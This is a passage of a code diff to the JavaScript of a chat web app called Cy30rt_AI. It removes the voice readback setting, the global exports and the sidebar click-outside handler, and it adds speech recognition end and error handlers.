-    return div.innerHTML;
+    
+    recognition.onerror = () => { voiceBtn.classList.remove("recording"); };
+    recognition.onend = () => { voiceBtn.classList.remove("recording"); };
 }
 
 // ============ SETTINGS ============
 function loadSettings() {
     autoPlayEnabled = localStorage.getItem("auto_play") === "true";
-    voiceReadbackEnabled = localStorage.getItem("voice_readback") === "true";
     voiceSpeed = parseFloat(localStorage.getItem("voice_speed") || "1.0");
     voicePitch = parseFloat(localStorage.getItem("voice_pitch") || "1.0");
-
+    
     const autoToggle = document.getElementById("autoPlayToggle");
-    const readbackToggle = document.getElementById("voiceReadbackToggle");
     const speedSlider = document.getElementById("voiceSpeed");
     const pitchSlider = document.getElementById("voicePitch");
     const speedVal = document.getElementById("speedValue");
     const pitchVal = document.getElementById("pitchValue");
-
+    
     if (autoToggle) autoToggle.checked = autoPlayEnabled;
-    if (readbackToggle) readbackToggle.checked = voiceReadbackEnabled;
     if (speedSlider) speedSlider.value = voiceSpeed;
     if (pitchSlider) pitchSlider.value = voicePitch;
     if (speedVal) speedVal.textContent = voiceSpeed === 1.0 ? "Normal" : `${voiceSpeed.toFixed(1)}x`;
@@ -845,15 +287,13 @@ function loadSettings() {
 
 function saveSettings() {
     autoPlayEnabled = document.getElementById("autoPlayToggle")?.checked || false;
-    voiceReadbackEnabled = document.getElementById("voiceReadbackToggle")?.checked || false;
     voiceSpeed = parseFloat(document.getElementById("voiceSpeed")?.value || "1.0");
     voicePitch = parseFloat(document.getElementById("voicePitch")?.value || "1.0");
-
+    
     localStorage.setItem("auto_play", autoPlayEnabled);
-    localStorage.setItem("voice_readback", voiceReadbackEnabled);
     localStorage.setItem("voice_speed", voiceSpeed);
     localStorage.setItem("voice_pitch", voicePitch);
-
+    
     const speedVal = document.getElementById("speedValue");
     const pitchVal = document.getElementById("pitchValue");
     if (speedVal) speedVal.textContent = voiceSpeed === 1.0 ? "Normal" : `${voiceSpeed.toFixed(1)}x`;
@@ -875,82 +315,58 @@ function renderLanguageGrid() {
     const grid = document.getElementById("languageModalGrid");
     if (!grid || typeof LANGUAGES === 'undefined') return;
     grid.innerHTML = "";
-    grid.className = "language-grid";
     Object.entries(LANGUAGES).forEach(([code, lang]) => {
         const btn = document.createElement("div");
         btn.className = "language-item";
         btn.onclick = () => changeLanguage(code);
-        btn.innerHTML = `
-            <div class="language-flag">${lang.flag}</div>
-            <div class="language-name">${lang.name}</div>
-            <div class="language-native">${lang.native}</div>
-        `;
+        btn.innerHTML = `<div class="language-flag">${lang.flag}</div><div class="language-name">${lang.name}</div><div class="language-native">${lang.native}</div>`;
         grid.appendChild(btn);
     });
 }
 
-// ============ MOBILE MENU ============
 function toggleMobileMenu() {
     document.getElementById("sidebar").classList.toggle("open");
 }
 
-// ============ EXPORT FUNCTIONS FOR GLOBAL ACCESS ============
-window.switchChat = switchChat;
-window.sendExample = sendExample;
-window.stopGeneration = stopGeneration;
-
 // ============ INITIALIZE ============
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("Cy30rt_AI Ready - Full Features with N-ATLAS and Stop Button");
+    console.log("Cy30rt_AI Ready");
     
-    initSession();
-    initChatHistory();
-    loadSettings();
     renderLanguageGrid();
-
+    loadSettings();
+    
     document.getElementById("sendBtn")?.addEventListener("click", sendMessage);
     document.getElementById("stopBtn")?.addEventListener("click", stopGeneration);
     document.getElementById("settingsBtn")?.addEventListener("click", showSettingsModal);
     document.getElementById("languageBtn")?.addEventListener("click", showLanguageModal);
     document.getElementById("mobileMenuBtn")?.addEventListener("click", toggleMobileMenu);
-
+    
     document.getElementById("messageInput")?.addEventListener("keypress", (e) => {
         if (e.key === "Enter" && !e.shiftKey) {
             e.preventDefault();
             sendMessage();
         }
     });
-
+    
     document.getElementById("messageInput")?.addEventListener("input", function(e) {
         e.target.style.height = "auto";
         e.target.style.height = Math.min(e.target.scrollHeight, 120) + "px";
     });
-
+    
     document.querySelector(".modal-close")?.addEventListener("click", closeLanguageModal);
     document.querySelector(".modal-close-settings")?.addEventListener("click", closeSettingsModal);
-
+    
     document.getElementById("autoPlayToggle")?.addEventListener("change", saveSettings);
-    document.getElementById("voiceReadbackToggle")?.addEventListener("change", saveSettings);
     document.getElementById("voiceSpeed")?.addEventListener("input", saveSettings);
     document.getElementById("voicePitch")?.addEventListener("input", saveSettings);
-
+    
     setupVoiceInput();
-
+    
     window.onclick = (event) => {
         if (event.target === document.getElementById("languageModal")) closeLanguageModal();
         if (event.target === document.getElementById("settingsModal")) closeSettingsModal();
     };
-
-    if (document.getElementById("sidebar")) {
-        document.addEventListener("click", function(e) {
-            const sidebar = document.getElementById("sidebar");
-            const menuBtn = document.getElementById("mobileMenuBtn");
-            if (sidebar && sidebar.classList.contains("open") && !sidebar.contains(e.target) && e.target !== menuBtn) {
-                sidebar.classList.remove("open");
-            }
-        });
-    }
-
+    
     const savedLang = localStorage.getItem("cy30rt_language");
     if (savedLang && typeof LANGUAGES !== 'undefined' && LANGUAGES[savedLang]) {
         currentLanguage = savedLang;
